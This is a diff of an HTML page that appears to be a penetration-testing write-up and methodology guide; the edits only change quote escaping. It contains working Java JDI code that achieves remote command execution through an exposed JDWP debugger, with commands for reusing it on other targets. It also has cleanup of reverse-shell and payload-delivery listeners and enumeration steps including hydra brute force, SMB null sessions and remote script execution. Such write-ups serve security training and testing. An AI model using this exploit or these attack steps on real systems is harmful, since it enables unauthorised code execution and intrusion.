+<span class="w">                    </span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="na">net</span><span class="p">.</span><span class="na">Socket</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span><span class="w"> </span><span class="mi">5000</span><span class="p">);</span>
+<span class="w">                    </span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">().</span><span class="na">write</span><span class="p">(</span><span class="sc">'x'</span><span class="p">);</span>
 <span class="w">                    </span><span class="n">s</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">().</span><span class="na">flush</span><span class="p">();</span>
 <span class="w">                    </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">3000</span><span class="p">);</span>
 <span class="w">                    </span><span class="n">s</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
@@ -1665,7 +1665,7 @@ expanded by <code>bash</code> after the split, so the string stays one token as 
 <span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Event</span><span class="w"> </span><span class="n">ev</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">es</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ev</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">BreakpointEvent</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                    </span><span class="n">ThreadReference</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">BreakpointEvent</span><span class="p">)</span><span class="w"> </span><span class="n">ev</span><span class="p">).</span><span class="na">thread</span><span class="p">();</span>
-<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;main&quot;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="na">name</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">"main"</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="na">name</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                        </span><span class="n">thread</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">t</span><span class="p">;</span>
 <span class="w">                        </span><span class="n">hit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">es</span><span class="p">;</span>
 <span class="w">                        </span><span class="k">break</span><span class="p">;</span>
@@ -1677,34 +1677,34 @@ expanded by <code>bash</code> after the split, so the string stays one token as 
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">thread</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&quot;no breakpoint event received&quot;</span><span class="p">);</span>
+<span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">"no breakpoint event received"</span><span class="p">);</span>
 <span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;[*] breakpoint hit on thread: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">thread</span><span class="p">.</span><span class="na">name</span><span class="p">()</span>
-<span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="s">&quot; frames=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">thread</span><span class="p">.</span><span class="na">frameCount</span><span class="p">());</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"[*] breakpoint hit on thread: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">thread</span><span class="p">.</span><span class="na">name</span><span class="p">()</span>
+<span class="w">                </span><span class="o">+</span><span class="w"> </span><span class="s">" frames="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">thread</span><span class="p">.</span><span class="na">frameCount</span><span class="p">());</span>
 <span class="w">        </span><span class="n">bp</span><span class="p">.</span><span class="na">disable</span><span class="p">();</span><span class="w">  </span><span class="c1">// avoid re-triggering during the pending invocation</span>
 
-<span class="w">        </span><span class="n">ReferenceType</span><span class="w"> </span><span class="n">rt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">classesByName</span><span class="p">(</span><span class="s">&quot;java.lang.Runtime&quot;</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">        </span><span class="n">ReferenceType</span><span class="w"> </span><span class="n">rt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">classesByName</span><span class="p">(</span><span class="s">"java.lang.Runtime"</span><span class="p">).</span><span class="na">get</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getRuntime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
 <span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">methodsByName</span><span class="p">(</span><span class="s">&quot;getRuntime&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="na">signature</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;()Ljava/lang/Runtime;&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">methodsByName</span><span class="p">(</span><span class="s">"getRuntime"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="na">signature</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">"()Ljava/lang/Runtime;"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                </span><span class="n">getRuntime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m</span><span class="p">;</span>
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">methodsByName</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="na">signature</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">&quot;(Ljava/lang/String;)Ljava/lang/Process;&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Method</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">rt</span><span class="p">.</span><span class="na">methodsByName</span><span class="p">(</span><span class="s">"exec"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="na">signature</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="s">"(Ljava/lang/String;)Ljava/lang/Process;"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
 <span class="w">                </span><span class="n">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m</span><span class="p">;</span>
 <span class="w">            </span><span class="p">}</span>
 <span class="w">        </span><span class="p">}</span>
 
 <span class="w">        </span><span class="n">ObjectReference</span><span class="w"> </span><span class="n">rtObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectReference</span><span class="p">)</span><span class="w"> </span><span class="p">((</span><span class="n">ClassType</span><span class="p">)</span><span class="w"> </span><span class="n">rt</span><span class="p">).</span><span class="na">invokeMethod</span><span class="p">(</span>
 <span class="w">                </span><span class="n">thread</span><span class="p">,</span><span class="w"> </span><span class="n">getRuntime</span><span class="p">,</span><span class="w"> </span><span class="n">Collections</span><span class="p">.</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span><span class="n">emptyList</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;[*] Runtime instance = &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rtObj</span><span class="p">);</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"[*] Runtime instance = "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">rtObj</span><span class="p">);</span>
 
 <span class="w">        </span><span class="n">StringReference</span><span class="w"> </span><span class="n">cmdRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">vm</span><span class="p">.</span><span class="na">mirrorOf</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
 <span class="w">        </span><span class="n">ObjectReference</span><span class="w"> </span><span class="n">proc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ObjectReference</span><span class="p">)</span><span class="w"> </span><span class="n">rtObj</span><span class="p">.</span><span class="na">invokeMethod</span><span class="p">(</span>
 <span class="w">                </span><span class="n">thread</span><span class="p">,</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">Collections</span><span class="p">.</span><span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span><span class="n">singletonList</span><span class="p">(</span><span class="n">cmdRef</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
-<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;[+] exec returned &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">proc</span><span class="p">);</span>
+<span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">"[+] exec returned "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">proc</span><span class="p">);</span>
 
 <span class="w">        </span><span class="n">hit</span><span class="p">.</span><span class="na">resume</span><span class="p">();</span>
 <span class="w">        </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">);</span>
@@ -1718,12 +1718,12 @@ expanded by <code>bash</code> after the split, so the string stays one token as 
 </pre></div>
 <h4>Reusing it on another JDWP target</h4>
 <p>The three optional arguments let you point the breakpoint elsewhere when port 5000 does not exist:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>java<span class="w"> </span>--add-modules<span class="w"> </span>jdk.jdi<span class="w"> </span>JdiBreakExec<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>java.lang.String<span class="w"> </span>getBytes<span class="w"> </span><span class="s1">&#39;()[B&#39;</span><span class="w">      </span>#<span class="w"> </span>default:<span class="w"> </span>any<span class="w"> </span>thread<span class="w"> </span>doing<span class="w"> </span>string<span class="w"> </span>I/O
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>java<span class="w"> </span>--add-modules<span class="w"> </span>jdk.jdi<span class="w"> </span>JdiBreakExec<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s1">'id'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>java.lang.String<span class="w"> </span>getBytes<span class="w"> </span><span class="s1">'()[B'</span><span class="w">      </span>#<span class="w"> </span>default:<span class="w"> </span>any<span class="w"> </span>thread<span class="w"> </span>doing<span class="w"> </span>string<span class="w"> </span>I/O
 </pre></div>
 <p>or, for a service that is genuinely busy, break on something you can provoke:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>java<span class="w"> </span>--add-modules<span class="w"> </span>jdk.jdi<span class="w"> </span>JdiBreakExec<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s1">&#39;id&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>java.lang.ClassLoader<span class="w"> </span>loadClass<span class="w"> </span><span class="s1">&#39;(Ljava/lang/String;)Ljava/lang/Class;&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>java<span class="w"> </span>--add-modules<span class="w"> </span>jdk.jdi<span class="w"> </span>JdiBreakExec<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">8000</span><span class="w"> </span><span class="s1">'id'</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>java.lang.ClassLoader<span class="w"> </span>loadClass<span class="w"> </span><span class="s1">'(Ljava/lang/String;)Ljava/lang/Class;'</span>
 </pre></div>
 <p>If the breakpoint never fires, the answer is almost always "the target is idle" — send it a request
 on whatever port it serves, and it will walk into your breakpoint.</p></div></section>
@@ -1790,7 +1790,7 @@ ls<span class="w"> </span>-la<span class="w"> </span>/root/proof.txt
 <p>Everything the exploit dropped lives in <code>/tmp</code>. Most of it is owned by <code>dev</code> and deletes cleanly; the
 exception is worth knowing about.</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/JdiBreakExec.java<span class="w"> </span>/tmp/JdiBreakExec.class<span class="w"> </span><span class="s1">&#39;/tmp/JdiBreakExec$1.class&#39;</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>rm<span class="w"> </span>-f<span class="w"> </span>/tmp/JdiBreakExec.java<span class="w"> </span>/tmp/JdiBreakExec.class<span class="w"> </span><span class="s1">'/tmp/JdiBreakExec$1.class'</span><span class="w"> </span><span class="se">\</span>
 <span class="w">      </span>/tmp/JdiVmSuspend.java<span class="w"> </span>/tmp/JdiVmSuspend.class<span class="w"> </span>/tmp/jdwp_rce.py<span class="w"> </span><span class="se">\</span>
 <span class="w">      </span>/tmp/r_id<span class="w"> </span>/tmp/r_proof<span class="w"> </span>/tmp/v_id<span class="w"> </span>/tmp/v_proof<span class="w"> </span><span class="se">\</span>
 <span class="w">      </span>/tmp/jdwp_probe<span class="w"> </span>/tmp/jdwp_probe3<span class="w"> </span>/tmp/jdi_touch_ok<span class="w"> </span>/tmp/jdwp_touch_ok<span class="w"> </span><span class="se">\</span>
@@ -1804,7 +1804,7 @@ rm: cannot remove '/tmp/v_proof': Operation not permitted</span></pre></div>
 <code>root</code> — and <code>/tmp</code> is sticky (<code>drwxrwxrwt</code>), which means <code>dev</code> may only delete files it owns. A
 <code>dev</code> shell cannot finish this cleanup, no matter how many times you retype the command.</p>
 <p><strong>On the target</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/tmp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;Jdi|jdwp|r_id|r_proof|v_id|v_proof&#39;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/tmp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'Jdi|jdwp|r_id|r_proof|v_id|v_proof'</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-rw-r--r--  1 root root   44 Nov 16 01:28 r_id
 -rw-r--r--  1 root root   88 Nov 16 01:28 r_proof
@@ -1820,9 +1820,9 @@ root-owned files are still sitting there is not.</p>
 <span class="c1">##   ncat -lv 4445            (reverse shell)</span>
 <span class="c1">##   python3 cap_server.py    (OOB capture)</span>
 <span class="c1">##   python3 -m http.server   (payload delivery)</span>
-pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">&#39;ncat -lv 4445&#39;</span>
-pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">&#39;cap_server.py&#39;</span>
-pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">&#39;http.server 8888&#39;</span>
+pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">'ncat -lv 4445'</span>
+pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">'cap_server.py'</span>
+pkill<span class="w"> </span>-f<span class="w"> </span><span class="s1">'http.server 8888'</span>
 
 rm<span class="w"> </span>-rf<span class="w"> </span>~/t4s<span class="w"> </span>~/jdwp
 </pre></div>
@@ -1941,7 +1941,7 @@ this version?" Version CVEs come last — most boxes are misconfigured, not unpa
 </pre></div>
 <p>If <code>161/udp</code> is open:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 </pre></div>
 <p>Then, on success, always:</p>
@@ -1958,7 +1958,7 @@ Descriptions are written for an internal audience and routinely name accounts an
 <h4>HTTP/HTTPS</h4>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
 <span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n&quot;</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
 <span class="k">done</span>
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
@@ -1969,7 +1969,7 @@ feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class=
 <li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
 </ul>
 <h4>FTP</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
 </pre></div>
 <p>Try the account name as the password. Check for key material, configs, and backups in the data
@@ -1979,8 +1979,8 @@ directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> ac
 ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
 </pre></div>
 <h4>SMB</h4>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
 nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 </pre></div>
 <hr />
@@ -1993,7 +1993,7 @@ escalation path depends on it.</p>
 <hr />
 <h3>Phase 5 — Local enumeration (Linux)</h3>
 <p>Send one script over one connection and read one report:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <p>Checklist, in the order that finds things:</p>
 <table>
@@ -2063,8 +2063,8 @@ escalation path depends on it.</p>
 <h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
 </pre></div>
 <p>What you are looking for, in priority order:</p>
 <ol>
@@ -2138,13 +2138,13 @@ nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </spa
 nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
 
 <span class="c1">## live hosts</span>
